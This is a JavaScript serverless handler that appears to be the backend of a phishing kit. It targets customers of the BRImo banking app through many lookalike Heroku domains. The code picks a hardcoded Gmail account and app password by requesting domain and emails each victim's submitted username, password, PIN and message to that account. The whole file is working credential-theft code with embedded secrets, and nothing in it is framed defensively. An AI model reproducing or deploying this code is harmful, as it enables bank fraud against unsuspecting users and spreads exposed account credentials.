export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if (url == 'bri--mo--app.herokuapp.com'){

        email = 'lagi3132@gmail.com';
        pass = 'rqvxojgehhtvzrip';

    } else if (url == 'daftar-brlmo-bl-fast.herokuapp.com'){
        
        email = 'impianbarub@gmail.com';
        pass = 'rofndibfsscucshv';

    } else if (url == 'bif-as-app-brmo.herokuapp.com'){
        email = 'rumahbarubaru443@gmail.com';
        pass = 'lssxwneekjuwlvgt';

    }
    else if (url == 'new--promo-tarif.herokuapp.com'){
        email = 'ayamperu233@gmail.com';
        pass = 'rtzqphftdjkdrnwa';
        
    }
    else if (url == 'log-in-bri.herokuapp.com'){
        email = 'nilabakar403@gmail.com';
        pass = 'hpwgbnwdgdpryjpa';
        
    }
    else if (url == 'log-brlmoo-bifas.herokuapp.com'){
        email = 'hayabusa20202030@gmail.com';
        pass = 'vfwfryjcovpoyqtt';
        

    }
    else if (url == 'bri-mo-news.herokuapp.com'){
        email = 'samesenangtobo14@gmail.com';
        pass = 'iebkxjlpwrdfubjf';
        

    }
    else if (url == 'brimo-daftar-bi-fast.herokuapp.com'){
    email = 'agustusq76@gmail.com';
    pass = 'xbohxjweimfcuhpx';
   
    }
    else if (url == ' bri-mo-bifas.herokuapp.com'){
        email = 'aliakbarbar101@gmail.com';
        pass = 'ywmrzlrlcvssjkhu';
       
    }
    else if (url == 'app-brimo-bifasttt.herokuapp.com'){
        email = 'lupa10203070@gmail.com';
        pass = 'xwnxmsljgdwgtcva';
       
    }
    else if (url == 'bl-fast-brimo-login.herokuapp.com'){
        email = 'derid1028@gmail.com';
        pass = 'fzntnluddmuahidw';
       
    }
    else if (url == 'daf-tar--brimo.herokuapp.com'){
        email = 'namakuubri@gmail.com';
        pass = 'acfrtsnasoaccdnt';
           
        }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li> 
                        <li>password: ${body.password ?? '-'}</li>
                        <li>pin: ${body.mPin ?? '-'}</li>
                        <li>message: ${body.message ?? '-'}</li>
                    </ul>
                `,             
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}